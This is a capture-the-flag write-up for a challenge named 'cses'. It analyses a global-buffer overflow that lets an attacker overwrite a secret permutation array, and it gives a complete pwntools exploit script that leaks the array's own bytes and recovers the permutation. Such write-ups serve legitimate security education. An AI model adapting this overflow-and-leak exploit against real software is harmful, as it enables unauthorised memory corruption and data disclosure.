# CTF Writeup: CSES Permutation (Pwn + Logic)

## Challenge Overview
**Challenge:** cses
**Category:** Pwn / Algorithm
**Objective:** Recover a hidden permutation of numbers 1..100 using only 6 queries.

## 1. Vulnerability Analysis
The `question` function has a critical flaw.
* **Buffer:** `query` is a 100-byte global buffer at `0x72c0`.
* **Target:** `arr` is the secret permutation array at `0x7340` (128 bytes after `query`).
* **Overflow:** `fgets` reads **184 bytes** into `query`. This allows us to write past `query` and **overwrite the first ~13 entries of `arr`**.

## 2. The Exploit: Self-Leak
We can force the program to leak its own secret key.
* **Normal Behavior:** The program outputs `query[arr[i]-1]`.
* **Attack:** We overwrite `arr[0]` with `129`.
* **Result:** The program outputs `query[128]`. Since `arr` starts at offset 128 from `query`, this effectively reads the first byte of `arr` itself!
* **Benefit:** We can leak the raw values of `arr` entries 13-90 by pointing `arr[0..12]` to them.

## 3. The Logic: Bit Signatures
For the remaining indices (91-99) that we can't leak in time, we use logic.
* **Signatures:** We send binary patterns (Query 0: `0101...`, Query 1: `0011...`). This assigns a unique 6-bit ID to every position.
* **Elimination:** A 6-bit ID gives 2 possible candidates (e.g., 5 or 69). We check which one was *already found* in the Leaked set. The answer must be the other one.

## 4. Exploit Script
This script implements the hybrid strategy. It uses `recvn(100)` to robustly handle special characters in the leak and consumes the initial output to ensure synchronization.

```python
from pwn import *
import time

# 1. Setup
exe = './cses'
elf = ELF(exe)
context.binary = exe
p = process(exe)

# FIX: Consume the initial "100\n" output from the binary
# If we don't do this, these bytes shift our read window and corrupt the data.
try:
    init_line = p.recvline()
    log.info(f"Consumed initial output: {init_line.strip()}")
except EOFError:
    pass

# Constants
N = 100
LEAK_SLOTS = 13 
known_arr = [None] * N
bit_signatures = [[0] * 6 for _ in range(N)]

# Schedule leaks for arr[13]..arr[90] (Total 78 values)
leak_targets_schedule = []
for i in range(6):
    start_idx = 13 + (i * 13)
    targets = []
    for j in range(13):
        if start_idx + j < 91: 
            targets.append(start_idx + j)
        else:
            targets.append(0)
    leak_targets_schedule.append(targets)

# 2. Perform 6 Queries
for q_idx in range(6):
    # A. Bit Signatures (Standard Logic)
    query_content = ""
    for i in range(N):
        if (i >> q_idx) & 1: query_content += "1"
        else: query_content += "0"
    
    # B. Exploit Payload (The Overflow)
    # 100 chars + null + 27 padding = 128 bytes to start of 'arr'
    padding = b'\x00' * 27 
    arr_payload = b""
    current_targets = leak_targets_schedule[q_idx]
    
    for t in current_targets:
        # Overwrite arr[k] to point to byte of arr[t]
        val = 129 + (t * 4)
        arr_payload += p32(val)
        
    final_payload = query_content.encode() + b'\x00' + padding + arr_payload
    
    # C. Send (Blindly)
    p.sendline(b'?')
    time.sleep(0.05)
    p.sendline(final_payload)
    
    # D. Read Response
    try:
        # Read exactly 100 bytes of the permuted string.
        output_str = p.recvn(100)
        
        # Consume the trailing newline printed by `cout << ... << endl`
        p.recvline() 
        
    except EOFError:
        log.error("Process exited unexpectedly")
        break
    
    # E. Process Leaks (Indices 0..12)
    for i in range(LEAK_SLOTS):
        t = current_targets[i]
        if t != 0:
            # The byte at output_str[i] is the raw value of arr[t]
            val = output_str[i]
            known_arr[t] = val
    
    # F. Process Signatures (Indices 13..99)
    for i in range(13, N):
        if output_str[i] == 49: # ASCII '1'
            bit_signatures[i][q_idx] = 1
        else:
            bit_signatures[i][q_idx] = 0
                
    log.info(f"Query {q_idx+1}/6 complete.")

# 3. Deduction
final_permutation = [0] * N

# A. Fill known leaks (13..90)
for i in range(13, 91):
    if known_arr[i] is not None:
        final_permutation[i] = known_arr[i]

# B. Fill overwritten values (0..12)
last_targets = leak_targets_schedule[5]
for i in range(LEAK_SLOTS):
    val_we_wrote = 129 + (last_targets[i] * 4)
    final_permutation[i] = val_we_wrote

# C. Deduce remaining (91..99)
known_set = set([x for x in known_arr if x is not None])

for i in range(91, N):
    sig_val = 0
    for b in range(6):
        if bit_signatures[i][b] == 1:
            sig_val |= (1 << b)
    
    cand1 = sig_val + 1
    cand2 = sig_val + 65
    
    if cand1 in known_set:
        final_permutation[i] = cand2
    elif cand2 in known_set:
        final_permutation[i] = cand1
    else:
        final_permutation[i] = cand1

# 4. Submit
p.sendline(b'!')
payload = " ".join(map(str, final_permutation))
p.sendline(payload.encode())

p.interactive()
```
